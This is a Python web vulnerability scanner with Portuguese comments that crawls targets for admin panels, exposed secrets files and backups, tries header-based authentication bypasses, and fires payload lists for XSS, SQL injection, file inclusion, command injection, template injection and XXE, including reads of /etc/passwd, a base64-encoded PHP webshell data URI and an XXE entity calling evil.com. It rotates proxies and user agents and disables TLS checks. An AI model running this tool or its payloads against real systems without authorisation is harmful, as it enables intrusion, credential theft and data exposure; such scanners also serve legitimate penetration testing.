#!/usr/bin/env python3
"""
Módulo de Fuzzing Avançado
Testes de segurança automatizados com payloads específicos por tecnologia
"""

import requests
import concurrent.futures
import random
import time
import re
import json
import base64
from typing import Dict, List, Set, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, quote
import logging

logger = logging.getLogger(__name__)

class AdvancedFuzzer:
    def __init__(self, config: Dict):
        self.config = config
        self.threads = config.get('threads', 15)
        self.timeout = config.get('timeout', 10)
        self.user_agents = config.get('user_agents', [])
        self.proxy_list = config.get('proxies', [])
        self.rate_limit = config.get('rate_limit', 0.5)
        
        # Carrega payloads avançados
        self.payloads = self._load_advanced_payloads()
        self.vuln_signatures = self._load_vulnerability_signatures()
        self.tech_specific_paths = self._load_tech_paths()
        
    def fuzz_comprehensive(self, target_info: Dict) -> List[Dict]:
        """Fuzzing completo e inteligente"""
        url = target_info['url']
        tech = target_info.get('tech', 'generic')
        
        logger.info(f"Iniciando fuzzing avançado em {url}")
        
        findings = []
        
        # Fuzzing paralelo de diferentes categorias
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self._fuzz_admin_panels, url, tech): "admin_panels",
                executor.submit(self._fuzz_sensitive_files, url, tech): "sensitive_files",
                executor.submit(self._fuzz_api_endpoints, url, tech): "api_endpoints",
                executor.submit(self._fuzz_backup_files, url): "backup_files",
                executor.submit(self._fuzz_config_files, url, tech): "config_files",
                executor.submit(self._test_authentication_bypass, url): "auth_bypass",
                executor.submit(self._test_injection_points, url, tech): "injection_tests",
                executor.submit(self._fuzz_development_files, url, tech): "dev_files"
            }
            
            for future in concurrent.futures.as_completed(futures):
                category = futures[future]
                try:
                    result = future.result()
                    if result:
                        findings.extend(result)
                        logger.info(f"{category}: {len(result)} achados")
                except Exception as e:
                    logger.error(f"Erro em {category}: {e}")
        
        # Post-processing: análise de contexto
        findings = self._analyze_findings_context(findings)
        
        return findings
    
    def _load_advanced_payloads(self) -> Dict:
        """Carrega payloads avançados organizados por categoria"""
        return {
            "xss": {
                "generic": [
                    "<script>alert('XSS')</script>",
                    "\"><script>alert('XSS')</script>",
                    "javascript:alert('XSS')",
                    "onmouseover=alert('XSS')",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "'><script>alert('XSS')</script>",
                    "\";alert('XSS');//",
                    "<iframe src=javascript:alert('XSS')>",
                    "<object data=javascript:alert('XSS')>"
                ],
                "reflected": [
                    "<script>alert(document.domain)</script>",
                    "';alert(String.fromCharCode(88,83,83))//",
                    "\"><img src=x onerror=prompt(1)>",
                    "javascript:alert(1)",
                    "<svg/onload=alert(1)>"
                ],
                "dom": [
                    "#<script>alert('DOM-XSS')</script>",
                    "javascript:alert('DOM-XSS')",
                    "<img src=1 onerror=alert('DOM-XSS')>"
                ],
                "php": [
                    "<?php echo 'XSS'; ?>",
                    "${alert('XSS')}",
                    "{{7*7}}",
                    "${7*7}"
                ],
                "nodejs": [
                    "{{7*7}}",
                    "<%= 7*7 %>",
                    "${7*7}",
                    "#{7*7}"
                ],
                "angular": [
                    "{{constructor.constructor('alert(1)')()}}",
                    "{{$on.constructor('alert(1)')()}}",
                    "{{7*7}}"
                ],
                "vue": [
                    "{{constructor.constructor('alert(1)')()}}",
                    "{{7*7}}"
                ]
            },
            "sqli": {
                "generic": [
                    "' OR 1=1--",
                    "' OR 'a'='a",
                    "\" OR \"\"=\"\"",
                    "' OR 1=1#",
                    "' OR 1=1/*",
                    "') OR ('1'='1",
                    "1' OR '1'='1",
                    "admin'--",
                    "admin'#",
                    "admin'/*",
                    "' OR 1=1 LIMIT 1--",
                    "' UNION SELECT 1,2,3--"
                ],
                "mysql": [
                    "' OR SLEEP(5)--",
                    "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--",
                    "' UNION SELECT @@version--",
                    "' OR 1=1 AND SLEEP(5)--"
                ],
                "postgresql": [
                    "' OR pg_sleep(5)--",
                    "' UNION SELECT version()--",
                    "'; SELECT pg_sleep(5)--"
                ],
                "mssql": [
                    "' WAITFOR DELAY '0:0:5'--",
                    "' OR 1=1 WAITFOR DELAY '0:0:5'--",
                    "' UNION SELECT @@version--"
                ],
                "oracle": [
                    "' OR 1=1--",
                    "' UNION SELECT banner FROM v$version--",
                    "' AND (SELECT COUNT(*) FROM ALL_TABLES)>0--"
                ]
            },
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=../config.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                "/proc/self/environ",
                "/proc/version",
                "/etc/issue"
            ],
            "rce": [
                "; ls -la",
                "| whoami",
                "&& id",
                "; cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "; ping -c 3 127.0.0.1",
                "| ping -n 3 127.0.0.1",
                "; sleep 5",
                "& timeout 5"
            ],
            "ssti": {
                "jinja2": [
                    "{{7*7}}",
                    "{{config}}",
                    "{{request}}",
                    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
                ],
                "twig": [
                    "{{7*7}}",
                    "{{_self.env.getRuntime('Symfony\\Component\\Form\\FormRenderer').renderBlock(arg1, 'widget')}}"
                ],
                "smarty": [
                    "{$smarty.version}",
                    "{php}echo `id`;{/php}"
                ]
            },
            "xxe": [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><test>&xxe;</test>'
            ]
        }
    
    def _load_vulnerability_signatures(self) -> Dict:
        """Assinaturas melhoradas para detecção de vulnerabilidades"""
        return {
            "sql_injection": [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"Driver.*SQL.*Server",
                r"OLE DB.*SQL Server",
                r"SQLServer.*JDBC",
                r"SqlException",
                r"ORA-\d{4,5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_",
                r"Warning.*\Wifx_",
                r"Exception.*Informix",
                r"Informix.*Driver",
                r"SQLSTATE\[\w+\]",
                r"Warning.*sqlite_",
                r"SQLite.*error"
            ],
            "xss": [
                r"<script[^>]*>.*?alert.*?</script>",
                r"javascript:.*alert",
                r"onload\s*=.*alert",
                r"onerror\s*=.*alert",
                r"onmouseover\s*=.*alert"
            ],
            "lfi": [
                r"root:.*:0:0:",
                r"daemon:.*:/usr/sbin/nologin",
                r"bin:.*:/bin/false",
                r"\[boot loader\]",
                r"ECHO is on\.",
                r"Volume.*Serial Number"
            ],
            "rce": [
                r"uid=\d+.*gid=\d+",
                r"root:.*:0:0:",
                r"sh:.*command not found",
                r"'whoami' is not recognized",
                r"bin/bash",
                r"total \d+",
                r"drwx"
            ],
            "ssti": [
                r"^49$",  # 7*7
                r"<flask\.config\.Config object",
                r"<class 'jinja2",
                r"TemplateRuntimeError",
                r"UndefinedError"
            ],
            "debug_info": [
                r"DEBUG.*=.*true",
                r"APP_DEBUG.*=.*true",
                r"display_errors.*=.*on",
                r"Whoops\\",
                r"Laravel.*error",
                r"Symfony.*Exception",
                r"Django.*DEBUG"
            ],
            "path_traversal": [
                r"Directory of [A-Z]:\\",
                r"\[DIR\].*\d+/\d+/\d+",
                r"Index of /",
                r"<title>Index of"
            ]
        }
    
    def _load_tech_paths(self) -> Dict:
        """Paths específicos por tecnologia"""
        return {
            "wordpress": [
                "/wp-admin/", "/wp-login.php", "/wp-config.php.bak", "/wp-content/debug.log",
                "/wp-includes/", "/wp-content/uploads/", "/wp-json/wp/v2/users",
                "/wp-content/plugins/", "/wp-content/themes/", "/.wp-config.php.swp",
                "/wp-admin/admin-ajax.php", "/wp-content/backup/", "/wp-config.txt"
            ],
            "drupal": [
                "/user/login", "/admin/", "/node/1", "/?q=admin", "/sites/default/files/",
                "/modules/", "/themes/", "/sites/all/", "/update.php", "/install.php",
                "/CHANGELOG.txt", "/sites/default/settings.php", "/core/"
            ],
            "joomla": [
                "/administrator/", "/components/", "/modules/", "/plugins/",
                "/templates/", "/cache/", "/logs/", "/tmp/", "/configuration.php",
                "/htaccess.txt", "/web.config.txt", "/README.txt"
            ],
            "laravel": [
                "/storage/logs/laravel.log", "/.env", "/config/", "/database/",
                "/storage/framework/", "/vendor/", "/artisan", "/bootstrap/cache/",
                "/public/", "/resources/views/", "/routes/web.php"
            ],
            "django": [
                "/admin/", "/static/", "/media/", "/settings.py", "/urls.py",
                "/manage.py", "/requirements.txt", "/.env", "/db.sqlite3",
                "/static/admin/", "/templates/"
            ],
            "nodejs": [
                "/node_modules/", "/package.json", "/package-lock.json", "/.env",
                "/server.js", "/app.js", "/index.js", "/config/", "/public/",
                "/routes/", "/bin/www", "/npm-debug.log"
            ],
            "php": [
                "/index.php", "/config.php", "/admin.php", "/login.php",
                "/phpinfo.php", "/test.php", "/info.php", "/debug.php",
                "/composer.json", "/composer.lock", "/.env"
            ],
            "aspnet": [
                "/web.config", "/global.asax", "/app_data/", "/bin/",
                "/app_code/", "/default.aspx", "/admin.aspx", "/login.aspx",
                "/web.config.bak", "/packages.config"
            ]
        }
    
    def _fuzz_admin_panels(self, base_url: str, tech: str) -> List[Dict]:
        """Fuzzing específico para painéis administrativos"""
        findings = []
        
        admin_paths = [
            "/admin", "/administrator", "/admin.php", "/admin.html", "/admin/",
            "/manager", "/management", "/control", "/controlpanel", "/cp",
            "/dashboard", "/panel", "/console", "/backend", "/backoffice",
            "/secure", "/private", "/restricted", "/internal", "/staff",
            "/moderator", "/supervisor", "/operator", "/owner", "/root"
        ]
        
        # Adiciona paths específicos da tecnologia
        if tech.lower() in self.tech_specific_paths:
            admin_paths.extend(self.tech_specific_paths[tech.lower()])
        
        for path in admin_paths:
            result = self._test_endpoint(base_url, path, "admin_panel")
            if result:
                findings.append(result)
            
            time.sleep(self.rate_limit)
        
        return findings
    
    def _fuzz_sensitive_files(self, base_url: str, tech: str) -> List[Dict]:
        """Fuzzing para arquivos sensíveis"""
        findings = []
        
        sensitive_files = [
            "/.env", "/.env.local", "/.env.production", "/.env.development",
            "/config.php", "/configuration.php", "/settings.php", "/config.ini",
            "/web.config", "/app.config", "/database.yml", "/secrets.yml",
            "/.htaccess", "/.htpasswd", "/robots.txt", "/sitemap.xml",
            "/crossdomain.xml", "/clientaccesspolicy.xml", "/.well-known/security.txt",
            "/composer.json", "/package.json", "/Gemfile", "/requirements.txt",
            "/README.md", "/CHANGELOG.md", "/LICENSE", "/VERSION",
            "/backup.zip", "/backup.tar.gz", "/dump.sql", "/database.sql",
            "/.git/config", "/.git/HEAD", "/.svn/entries", "/.bzr/branch-format",
            "/CVS/Entries", "/.hg/hgrc", "/.DS_Store", "/Thumbs.db"
        ]
        
        # Files específicos por tecnologia
        tech_files = {
            "wordpress": ["/wp-config.php", "/wp-config.php.bak", "/wp-content/debug.log"],
            "drupal": ["/sites/default/settings.php", "/CHANGELOG.txt"],
            "joomla": ["/configuration.php", "/htaccess.txt"],
            "laravel": ["/storage/logs/laravel.log", "/.env.example"],
            "django": ["/settings.py", "/db.sqlite3"],
            "nodejs": ["/package-lock.json", "/yarn.lock", "/npm-debug.log"]
        }
        
        if tech.lower() in tech_files:
            sensitive_files.extend(tech_files[tech.lower()])
        
        for file_path in sensitive_files:
            result = self._test_endpoint(base_url, file_path, "sensitive_file")
            if result:
                findings.append(result)
            
            time.sleep(self.rate_limit)
        
        return findings
    
    def _fuzz_api_endpoints(self, base_url: str, tech: str) -> List[Dict]:
        """Fuzzing para endpoints de API"""
        findings = []
        
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/restapi",
            "/graphql", "/gql", "/ws", "/websocket", "/rpc", "/jsonrpc",
            "/soap", "/wsdl", "/api/users", "/api/admin", "/api/auth",
            "/api/login", "/api/token", "/api/oauth", "/api/key",
            "/api/config", "/api/status", "/api/health", "/api/info",
            "/api/docs", "/api/swagger", "/swagger", "/swagger-ui",
            "/docs", "/documentation", "/redoc", "/openapi.json"
        ]
        
        # Testa diferentes métodos HTTP
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        for path in api_paths:
            for method in methods:
                result = self._test_endpoint_method(base_url, path, method, "api_endpoint")
                if result:
                    findings.append(result)
                
                time.sleep(self.rate_limit)
        
        return findings
    
    def _fuzz_backup_files(self, base_url: str) -> List[Dict]:
        """Fuzzing para arquivos de backup"""
        findings = []
        
        backup_extensions = [".bak", ".old", ".orig", ".backup", ".save", ".copy", ".tmp", ".swp", ".swo", "~"]
        common_files = ["index", "config", "database", "admin", "login", "user", "password", "secret"]
        common_extensions = [".php", ".html", ".txt", ".xml", ".json", ".yml", ".ini", ".conf"]
        
        # Gera combinações de arquivos de backup
        for file_name in common_files:
            for ext in common_extensions:
                base_file = f"/{file_name}{ext}"
                
                # Testa arquivo original
                result = self._test_endpoint(base_url, base_file, "backup_file")
                if result:
                    findings.append(result)
                
                # Testa versões de backup
                for backup_ext in backup_extensions:
                    backup_file = f"{base_file}{backup_ext}"
                    result = self._test_endpoint(base_url, backup_file, "backup_file")
                    if result:
                        findings.append(result)
                    
                    time.sleep(self.rate_limit)
        
        return findings
    
    def _fuzz_config_files(self, base_url: str, tech: str) -> List[Dict]:
        """Fuzzing para arquivos de configuração"""
        findings = []
        
        config_paths = [
            "/config/", "/configuration/", "/settings/", "/etc/",
            "/conf/", "/cfg/", "/configs/", "/app/config/",
            "/application/config/", "/site/config/", "/system/config/"
        ]
        
        config_files = [
            "config.php", "configuration.php", "settings.php", "config.ini",
            "app.config", "web.config", "database.yml", "config.yml",
            "settings.yml", "parameters.yml", "config.json", "settings.json",
            "database.json", "app.json", "local.json", "production.json",
            "development.json", "test.json", "staging.json"
        ]
        
        # Testa arquivos de config em diferentes diretórios
        for path in config_paths:
            for config_file in config_files:
                full_path = f"{path}{config_file}"
                result = self._test_endpoint(base_url, full_path, "config_file")
                if result:
                    findings.append(result)
                
                time.sleep(self.rate_limit)
        
        return findings
    
    def _fuzz_development_files(self, base_url: str, tech: str) -> List[Dict]:
        """Fuzzing para arquivos de desenvolvimento"""
        findings = []
        
        dev_files = [
            "/test.php", "/test.html", "/debug.php", "/info.php", "/phpinfo.php",
            "/test/", "/testing/", "/dev/", "/development/", "/staging/",
            "/demo/", "/example/", "/sample/", "/temp/", "/tmp/",
            "/old/", "/backup/", "/archive/", "/beta/", "/alpha/",
            "/v1/", "/v2/", "/version/", "/release/", "/build/"
        ]
        
        # Arquivos específicos por tecnologia
        tech_dev_files = {
            "nodejs": ["/server.js", "/app.js", "/index.js", "/main.js"],
            "python": ["/app.py", "/main.py", "/wsgi.py", "/manage.py"],
            "php": ["/index.php", "/main.php", "/app.php", "/bootstrap.php"],
            "ruby": ["/app.rb", "/config.ru", "/Gemfile", "/Rakefile"],
            "java": ["/web.xml", "/applicationContext.xml", "/struts.xml"]
        }
        
        if tech.lower() in tech_dev_files:
            dev_files.extend(tech_dev_files[tech.lower()])
        
        for file_path in dev_files:
            result = self._test_endpoint(base_url, file_path, "dev_file")
            if result:
                findings.append(result)
            
            time.sleep(self.rate_limit)
        
        return findings
    
    def _test_authentication_bypass(self, base_url: str) -> List[Dict]:
        """Testa técnicas de bypass de autenticação"""
        findings = []
        
        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"X-Cluster-Client-IP": "127.0.0.1"}
        ]
        
        auth_paths = ["/admin", "/administrator", "/dashboard", "/panel"]
        
        for path in auth_paths:
            for headers in bypass_headers:
                result = self._test_endpoint_with_headers(base_url, path, headers, "auth_bypass")
                if result and result.get('status_code', 0) not in [401, 403, 404]:
                    findings.append(result)
                
                time.sleep(self.rate_limit)
        
        return findings
    
    def _test_injection_points(self, base_url: str, tech: str) -> List[Dict]:
        """Testa pontos de injeção"""
        findings = []
        
        # Parâmetros comuns para teste
        test_params = ["id", "page", "file", "path", "url", "q", "search", "query", "cmd", "exec"]
        
        # Payloads por tipo de injeção
        test_payloads = {
            "xss": self.payloads["xss"]["generic"][:3],  # Apenas os primeiros 3
            "sqli": self.payloads["sqli"]["generic"][:3],
            "lfi": self.payloads["lfi"][:3],
            "rce": self.payloads["rce"][:3]
        }
        
        # Se tecnologia específica, usa payloads correspondentes
        if tech.lower() in self.payloads["xss"]:
            test_payloads["xss"] = self.payloads["xss"][tech.lower()][:2]
        
        for param in test_params:
            for injection_type, payloads in test_payloads.items():
                for payload in payloads:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    result = self._test_injection(test_url, payload, injection_type)
                    if result:
                        findings.append(result)
                    
                    time.sleep(self.rate_limit)
        
        return findings
    
    def _test_endpoint(self, base_url: str, path: str, category: str) -> Optional[Dict]:
        """Testa um endpoint específico"""
        url = urljoin(base_url, path)
        
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents) if self.user_agents else "Mozilla/5.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
            
            proxies = {}
            if self.proxy_list:
                proxy = random.choice(self.proxy_list)
                proxies = {"http": proxy, "https": proxy}
            
            response = requests.get(
                url,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=True,
                verify=False,
                proxies=proxies
            )
            
            if self._is_interesting_response(response, category):
                return {
                    "url": url,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "content_type": response.headers.get('Content-Type', ''),
                    "category": category,
                    "headers": dict(response.headers),
                    "vulnerabilities": self._check_vulnerabilities(response),
                    "risk_score": self._calculate_risk_score(response, category),
                    "response_sample": response.text[:500] if len(response.text) > 500 else response.text
                }
        
        except Exception as e:
            logger.debug(f"Erro testando {url}: {e}")
        
        return None
    
    def _test_endpoint_method(self, base_url: str, path: str, method: str, category: str) -> Optional[Dict]:
        """Testa endpoint com método HTTP específico"""
        url = urljoin(base_url, path)
        
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents) if self.user_agents else "Mozilla/5.0",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
            
            response = requests.request(
                method,
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            
            if self._is_interesting_response(response, category):
                return {
                    "url": url,
                    "method": method,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "content_type": response.headers.get('Content-Type', ''),
                    "category": category,
                    "headers": dict(response.headers),
                    "vulnerabilities": self._check_vulnerabilities(response),
                    "risk_score": self._calculate_risk_score(response, category),
                    "response_sample": response.text[:500] if len(response.text) > 500 else response.text
                }
        
        except Exception as e:
            logger.debug(f"Erro testando {method} {url}: {e}")
        
        return None
    
    def _test_endpoint_with_headers(self, base_url: str, path: str, custom_headers: Dict, category: str) -> Optional[Dict]:
        """Testa endpoint com headers customizados"""
        url = urljoin(base_url, path)
        
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents) if self.user_agents else "Mozilla/5.0",
                **custom_headers
            }
            
            response = requests.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            
            return {
                "url": url,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "content_type": response.headers.get('Content-Type', ''),
                "category": category,
                "custom_headers": custom_headers,
                "headers": dict(response.headers),
                "vulnerabilities": self._check_vulnerabilities(response),
                "risk_score": self._calculate_risk_score(response, category),
                "response_sample": response.text[:200] if len(response.text) > 200 else response.text
            }
        
        except Exception as e:
            logger.debug(f"Erro testando {url} com headers: {e}")
        
        return None
    
    def _test_injection(self, url: str, payload: str, injection_type: str) -> Optional[Dict]:
        """Testa injeção específica"""
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents) if self.user_agents else "Mozilla/5.0"
            }
            
            response = requests.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            
            # Verifica se payload foi refletido ou executado
            vulnerabilities = self._check_vulnerabilities(response)
            payload_reflected = payload in response.text
            
            if vulnerabilities or payload_reflected:
                return {
                    "url": url,
                    "payload": payload,
                    "injection_type": injection_type,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "category": "injection_test",
                    "vulnerabilities": vulnerabilities,
                    "payload_reflected": payload_reflected,
                    "risk_score": self._calculate_injection_risk(injection_type, vulnerabilities, payload_reflected),
                    "response_sample": response.text[:300] if len(response.text) > 300 else response.text
                }
        
        except Exception as e:
            logger.debug(f"Erro testando injeção em {url}: {e}")
        
        return None
    
    def _is_interesting_response(self, response, category: str) -> bool:
        """Determina se uma resposta é interessante"""
        status = response.status_code
        content_length = len(response.content)
        content_type = response.headers.get('Content-Type', '').lower()
        
        # Respostas sempre interessantes
        if status in [200, 301, 302, 403, 500]:
            if content_length > 100:  # Não é página vazia
                return True
        
        # Específico por categoria
        if category == "admin_panel":
            return status in [200, 302, 401, 403] and content_length > 500
        
        elif category == "sensitive_file":
            return status == 200 and content_length > 10
        
        elif category == "api_endpoint":
            return status in [200, 401, 403] and ('json' in content_type or 'xml' in content_type)
        
        elif category == "backup_file":
            return status == 200 and content_length > 100
        
        return False
    
    def _check_vulnerabilities(self, response) -> List[str]:
        """Verifica vulnerabilidades na resposta"""
        vulnerabilities = []
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for vuln_type, patterns in self.vuln_signatures.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE) or re.search(pattern, headers, re.IGNORECASE):
                    vulnerabilities.append(vuln_type)
                    break
        
        return list(set(vulnerabilities))
    
    def _calculate_risk_score(self, response, category: str) -> int:
        """Calcula score de risco (0-10)"""
        score = 0
        
        # Base score por categoria
        category_scores = {
            "admin_panel": 8,
            "sensitive_file": 7,
            "api_endpoint": 6,
            "backup_file": 7,
            "config_file": 9,
            "auth_bypass": 9,
            "dev_file": 5
        }
        
        score = category_scores.get(category, 3)
        
        # Ajustes baseados na resposta
        if response.status_code == 200:
            score += 2
        elif response.status_code in [301, 302]:
            score += 1
        elif response.status_code in [401, 403]:
            score -= 1
        
        # Verifica conteúdo sensível
        sensitive_keywords = ['password', 'secret', 'api_key', 'token', 'credential', 'database', 'mysql', 'admin']
        content = response.text.lower()
        
        for keyword in sensitive_keywords:
            if keyword in content:
                score += 1
                break
        
        return min(10, max(0, score))
    
    def _calculate_injection_risk(self, injection_type: str, vulnerabilities: List[str], payload_reflected: bool) -> int:
        """Calcula risco específico para injeções"""
        base_scores = {
            "xss": 7,
            "sqli": 9,
            "lfi": 8,
            "rce": 10,
            "ssti": 9
        }
        
        score = base_scores.get(injection_type, 5)
        
        if vulnerabilities:
            score += 2
        
        if payload_reflected:
            score += 1
        
        return min(10, score)
    
    def _analyze_findings_context(self, findings: List[Dict]) -> List[Dict]:
        """Análise de contexto dos achados"""
        for finding in findings:
            # Adiciona contexto baseado no tipo de achado
            if finding.get('category') == 'admin_panel':
                finding['impact'] = self._assess_admin_panel_impact(finding)
            elif finding.get('category') == 'sensitive_file':
                finding['impact'] = self._assess_file_impact(finding)
            elif finding.get('category') == 'injection_test':
                finding['impact'] = self._assess_injection_impact(finding)
            
            # Adiciona recomendações
            finding['recommendations'] = self._get_recommendations(finding)
        
        # Ordena por score de risco
        findings.sort(key=lambda x: x.get('risk_score', 0), reverse=True)
        
        return findings
    
    def _assess_admin_panel_impact(self, finding: Dict) -> str:
        """Avalia impacto de painéis admin"""
        if finding.get('status_code') == 200:
            return "ALTO - Painel administrativo acessível sem autenticação"
        elif finding.get('status_code') in [401, 403]:
            return "MÉDIO - Painel administrativo encontrado, mas protegido"
        else:
            return "BAIXO - Possível painel administrativo"
    
    def _assess_file_impact(self, finding: Dict) -> str:
        """Avalia impacto de arquivos sensíveis"""
        url = finding.get('url', '').lower()
        
        if any(sensitive in url for sensitive in ['.env', 'config', 'database', 'backup']):
            return "CRÍTICO - Arquivo altamente sensível exposto"
        elif any(info in url for info in ['readme', 'changelog', 'version']):
            return "BAIXO - Arquivo informativo exposto"
        else:
            return "MÉDIO - Arquivo potencialmente sensível"
    
    def _assess_injection_impact(self, finding: Dict) -> str:
        """Avalia impacto de injeções"""
        injection_type = finding.get('injection_type', '')
        
        if injection_type == 'rce':
            return "CRÍTICO - Execução remota de código possível"
        elif injection_type == 'sqli':
            return "ALTO - Injeção SQL detectada"
        elif injection_type == 'xss':
            return "MÉDIO - Cross-Site Scripting detectado"
        else:
            return "BAIXO - Possível vulnerabilidade de injeção"
    
    def _get_recommendations(self, finding: Dict) -> List[str]:
        """Gera recomendações específicas"""
        recommendations = []
        category = finding.get('category', '')
        
        if category == 'admin_panel':
            recommendations = [
                "Implementar autenticação robusta",
                "Usar autenticação multifator (MFA)",
                "Restringir acesso por IP",
                "Implementar rate limiting",
                "Monitorar tentativas de acesso"
            ]
        elif category == 'sensitive_file':
            recommendations = [
                "Remover arquivo do servidor web",
                "Configurar .htaccess para bloquear acesso",
                "Mover arquivo para fora do document root",
                "Implementar controle de acesso adequado"
            ]
        elif category == 'injection_test':
            recommendations = [
                "Sanitizar e validar todas as entradas",
                "Usar prepared statements",
                "Implementar WAF (Web Application Firewall)",
                "Realizar testes de segurança regulares",
                "Aplicar princípio do menor privilégio"
            ]
        
        return recommendations 